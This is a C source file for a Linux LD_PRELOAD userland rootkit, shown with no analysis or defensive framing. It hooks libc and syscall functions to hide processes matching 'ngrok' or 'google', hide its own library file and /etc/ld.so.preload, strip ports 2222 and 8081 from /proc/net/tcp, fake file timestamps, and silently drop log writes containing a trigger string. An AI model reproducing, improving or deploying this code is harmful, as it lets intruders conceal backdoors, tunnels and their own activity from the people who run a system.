#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/syscall.h>
#include <stdarg.h>
#include <limits.h>
#include <fcntl.h>

// --- STRINGS ---
// All sensitive strings are now in plain text, making the code easier to read and understand.
// The obfuscation code has been removed.

static char CMDLINE_TO_FILTER[] = "ngrok";
static char SECOND_CMDLINE_TO_FILTER[] = "google";
static char PRELOAD_FILE_PATH[] = "/etc/ld.so.preload";
static char PATH_TO_FILTER[] = "/home/user";
static char EXECUTABLE_TO_FILTER[] = "ngrok";
static char LOG_SPOOF_TRIGGER[] = "MALICIOUS_ACTIVITY";
static char TEMPLATE_FILE_PATH[] = "/bin/bash";
static char ROOTKIT_LIB_PATH[] = "/usr/local/lib/libgit.so"; 

// Pointers to the strings
static char* CMDLINE_TO_FILTER_PTR = CMDLINE_TO_FILTER;
static char* SECOND_CMDLINE_TO_FILTER_PTR = SECOND_CMDLINE_TO_FILTER;
static char* PRELOAD_FILE_PATH_PTR = PRELOAD_FILE_PATH;
static char* PATH_TO_FILTER_PTR = PATH_TO_FILTER;
static char* EXECUTABLE_TO_FILTER_PTR = EXECUTABLE_TO_FILTER;
static char* LOG_SPOOF_TRIGGER_PTR = LOG_SPOOF_TRIGGER;
static char* TEMPLATE_FILE_PATH_PTR = TEMPLATE_FILE_PATH;
static char* ROOTKIT_LIB_PATH_PTR = ROOTKIT_LIB_PATH;

static const int PORTS_TO_HIDE[] = {2222, 8081};
static const int NUM_PORTS_TO_HIDE = sizeof(PORTS_TO_HIDE) / sizeof(PORTS_TO_HIDE[0]);

// Original function pointers
static long (*original_syscall)(long, ...) = NULL;
static ssize_t (*original_write)(int, const void*, size_t) = NULL;
static ssize_t (*original_read)(int, void*, size_t) = NULL;
static ssize_t (*original_readlink)(const char*, char*, size_t) = NULL;
static FILE* (*original_fopen)(const char*, const char*) = NULL;
static int (*original_open)(const char*, int, ...) = NULL;
static int (*original_access)(const char*, int) = NULL;
static int (*original_execve)(const char*, char *const[], char *const[]) = NULL;
static pid_t (*original_fork)(void) = NULL;

// Pointers for stat functions (timestamp spoofing)
static int (*original_xstat)(int, const char*, struct stat*) = NULL;
static int (*original_lxstat)(int, const char*, struct stat*) = NULL;
static int (*original_fxstat)(int, int, struct stat*) = NULL;

// --- PID HIDING ---
#define MAX_HIDDEN_PIDS 256
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int num_hidden_pids = 0;

static void add_hidden_pid(pid_t pid) {
    if (num_hidden_pids < MAX_HIDDEN_PIDS) {
        hidden_pids[num_hidden_pids++] = pid;
    }
}

static int is_pid_hidden(pid_t pid) {
    for (int i = 0; i < num_hidden_pids; i++) {
        if (hidden_pids[i] == pid) {
            return 1;
        }
    }
    return 0;
}

__attribute__((constructor))
static void initialize_hooks() {
    original_syscall = dlsym(RTLD_NEXT, "syscall");
    if (!original_syscall) { fprintf(stderr, "Rootkit Error: could not find original syscall\n"); }
    original_write = dlsym(RTLD_NEXT, "write");
    if (!original_write) { fprintf(stderr, "Rootkit Error: could not find original write\n"); }
    original_read = dlsym(RTLD_NEXT, "read");
    if (!original_read) { fprintf(stderr, "Rootkit Error: could not find original read\n"); }
    original_readlink = dlsym(RTLD_NEXT, "readlink");
    if (!original_readlink) { fprintf(stderr, "Rootkit Error: could not find original readlink\n"); }
    original_fopen = dlsym(RTLD_NEXT, "fopen");
    if (!original_fopen) { fprintf(stderr, "Rootkit Error: could not find original fopen\n"); }
    original_open = dlsym(RTLD_NEXT, "open");
    if (!original_open) { fprintf(stderr, "Rootkit Error: could not find original open\n"); }
    original_access = dlsym(RTLD_NEXT, "access");
    if (!original_access) { fprintf(stderr, "Rootkit Error: could not find original access\n"); }
    original_execve = dlsym(RTLD_NEXT, "execve");
    if (!original_execve) { fprintf(stderr, "Rootkit Error: could not find original execve\n"); }
    original_fork = dlsym(RTLD_NEXT, "fork");
    if (!original_fork) { fprintf(stderr, "Rootkit Error: could not find original fork\n"); }
    original_xstat = dlsym(RTLD_NEXT, "__xstat");
    if (!original_xstat) { fprintf(stderr, "Rootkit Error: could not find original __xstat\n"); }
    original_lxstat = dlsym(RTLD_NEXT, "__lxstat");
    if (!original_lxstat) { fprintf(stderr, "Rootkit Error: could not find original __lxstat\n"); }
    original_fxstat = dlsym(RTLD_NEXT, "__fxstat");
    if (!original_fxstat) { fprintf(stderr, "Rootkit Error: could not find original __fxstat\n"); }
}

static int resolve_path(const char* input_path, char* resolved_path) {
    if (input_path[0] == '/') {
        strncpy(resolved_path, input_path, PATH_MAX - 1);
        resolved_path[PATH_MAX - 1] = '\0';
        return 1;
    }
    if (getcwd(resolved_path, PATH_MAX) == NULL) {
        return 0;
    }
    strncat(resolved_path, "/", PATH_MAX - strlen(resolved_path) - 1);
    strncat(resolved_path, input_path, PATH_MAX - strlen(resolved_path) - 1);
    return 1;
}

static int should_hide_path(const char* path) {
    if (strcmp(path, PRELOAD_FILE_PATH_PTR) == 0 ||
        strcmp(path, PATH_TO_FILTER_PTR) == 0 ||
        strcmp(path, EXECUTABLE_TO_FILTER_PTR) == 0 ||
        strcmp(path, ROOTKIT_LIB_PATH_PTR) == 0) {
        return 1;
    }
    return 0;
}

// --- TIMESTAMP SPOOFING HOOKS ---
int __xstat(int ver, const char *path, struct stat *stat_buf) {
    if (!original_xstat) initialize_hooks();
    
    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        return original_xstat(ver, TEMPLATE_FILE_PATH_PTR, stat_buf);
    }
    return original_xstat(ver, path, stat_buf);
}

int __lxstat(int ver, const char *path, struct stat *stat_buf) {
    if (!original_lxstat) initialize_hooks();

    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        return original_lxstat(ver, TEMPLATE_FILE_PATH_PTR, stat_buf);
    }
    return original_lxstat(ver, path, stat_buf);
}

// --- CORE HOOKS ---
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    if (!original_execve) initialize_hooks();

    int should_hide_this_pid = 0;
    // Check the executable path itself
    if (strcasestr(pathname, CMDLINE_TO_FILTER_PTR) || strcasestr(pathname, SECOND_CMDLINE_TO_FILTER_PTR)) {
        should_hide_this_pid = 1;
    }

    // Also check all command-line arguments, not just the executable path.
    // This makes the hiding more robust.
    if (!should_hide_this_pid) {
        for (int i = 0; argv[i] != NULL; i++) {
            if (strcasestr(argv[i], CMDLINE_TO_FILTER_PTR) || strcasestr(argv[i], SECOND_CMDLINE_TO_FILTER_PTR)) {
                should_hide_this_pid = 1;
                break;
            }
        }
    }

    if (should_hide_this_pid) {
        add_hidden_pid(getpid());
    }

    return original_execve(pathname, argv, envp);
}

pid_t fork(void) {
    if (!original_fork) initialize_hooks();
    
    pid_t parent_pid = getpid();
    pid_t child_pid = original_fork();

    if (child_pid > 0 && is_pid_hidden(parent_pid)) {
        add_hidden_pid(child_pid);
    }
    return child_pid;
}


long syscall(long number, ...) {
    if (!original_syscall) { errno = EFAULT; return -1; }

    if (number == SYS_getdents || number == SYS_getdents64) {
        va_list args;
        va_start(args, number);
        int fd = va_arg(args, int);
        struct dirent* dirp = va_arg(args, struct dirent*);
        unsigned int count = va_arg(args, unsigned int);
        va_end(args);

        long ret = original_syscall(number, fd, dirp, count);
        if (ret <= 0) return ret;

        char fd_path[256];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        char dir_path[PATH_MAX];
        ssize_t path_len = original_readlink(fd_path, dir_path, sizeof(dir_path) - 1);

        if (path_len <= 0) return ret;
        dir_path[path_len] = '\0';

        long processed_bytes = 0;
        struct dirent* current_entry = dirp;
        while (processed_bytes < ret) {
            
            int should_hide = 0;
            pid_t pid = atoi(current_entry->d_name);
            if (pid > 0 && is_pid_hidden(pid)) {
                should_hide = 1;
            } else {
                // BUG FIX: Use a more robust method to prevent truncation warnings.
                // We now check the return value of snprintf to ensure the full path was written.
                char full_path[PATH_MAX];
                int path_needed = snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, current_entry->d_name);
                
                // Check if snprintf was successful and did not truncate the path.
                if (path_needed > 0 && (size_t)path_needed < sizeof(full_path)) {
                    if (should_hide_path(full_path)) {
                        should_hide = 1;
                    }
                }
            }

            if (should_hide) {
                int entry_len = current_entry->d_reclen;
                long remaining_bytes = ret - (processed_bytes + entry_len);
                memmove(current_entry, (char*)current_entry + entry_len, remaining_bytes);
                ret -= entry_len;
                continue; 
            }

            processed_bytes += current_entry->d_reclen;
            current_entry = (struct dirent*)((char*)dirp + processed_bytes);
        }
        return ret;
    }

    va_list args;
    va_start(args, number);
    long a1 = va_arg(args, long), a2 = va_arg(args, long), a3 = va_arg(args, long);
    long a4 = va_arg(args, long), a5 = va_arg(args, long), a6 = va_arg(args, long);
    va_end(args);
    return original_syscall(number, a1, a2, a3, a4, a5, a6);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read) { errno = EFAULT; return -1; }
    ssize_t ret = original_read(fd, buf, count);
    if (ret <= 0) return ret;

    char fd_path[256], proc_path[256];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    ssize_t path_len = original_readlink(fd_path, proc_path, sizeof(proc_path) - 1);

    if (path_len > 0) {
        proc_path[path_len] = '\0';
        if (strcmp(proc_path, "/proc/net/tcp") == 0 || strcmp(proc_path, "/proc/net/tcp6") == 0) {
            char* temp_buf = (char*)malloc(ret);
            if (!temp_buf) return ret;

            char* line_start = (char*)buf;
            char* write_ptr = temp_buf;
            ssize_t filtered_len = 0;

            for (ssize_t i = 0; i < ret; ++i) {
                if (((char*)buf)[i] == '\n' || i == ret - 1) {
                    ssize_t line_len = &((char*)buf)[i] - line_start + 1;
                    int should_hide = 0;
                    for (int j = 0; j < NUM_PORTS_TO_HIDE; ++j) {
                        char hex_port[16];
                        snprintf(hex_port, sizeof(hex_port), ":%04X", PORTS_TO_HIDE[j]);
                        if (memmem(line_start, line_len, hex_port, strlen(hex_port)) != NULL) {
                            should_hide = 1;
                            break;
                        }
                    }
                    if (!should_hide) {
                        memcpy(write_ptr, line_start, line_len);
                        write_ptr += line_len;
                        filtered_len += line_len;
                    }
                    line_start = &((char*)buf)[i] + 1;
                }
            }
            memcpy(buf, temp_buf, filtered_len);
            free(temp_buf);
            return filtered_len;
        }
    }
    return ret;
}

ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
    if (!original_readlink) { errno = EFAULT; return -1; }
    ssize_t ret = original_readlink(pathname, buf, bufsiz);
    if (ret > 0 && (size_t)ret < bufsiz) {
        buf[ret] = '\0'; 
        if (should_hide_path(buf)) {
            errno = ENOENT;
            return -1;
        }
    }
    return ret;
}


int open(const char *pathname, int flags, ...) {
    if (!original_open) { errno = EFAULT; return -1; }
    
    char full_path[PATH_MAX];
    if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return -1;
    }

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }
    return original_open(pathname, flags, mode);
}

int access(const char *pathname, int mode) {
    if (!original_access) { errno = EFAULT; return -1; }
    
    char full_path[PATH_MAX];
    if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return -1;
    }
    return original_access(pathname, mode);
}

ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) { errno = EFAULT; return -1; }
    if (memmem(buf, count, LOG_SPOOF_TRIGGER_PTR, strlen(LOG_SPOOF_TRIGGER_PTR)) != NULL) {
        return count;
    }
    return original_write(fd, buf, count);
}

FILE* fopen(const char *path, const char *mode) {
    if (!original_fopen) { errno = ENOENT; return NULL; }

    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return NULL;
    }
    return original_fopen(path, mode);
}
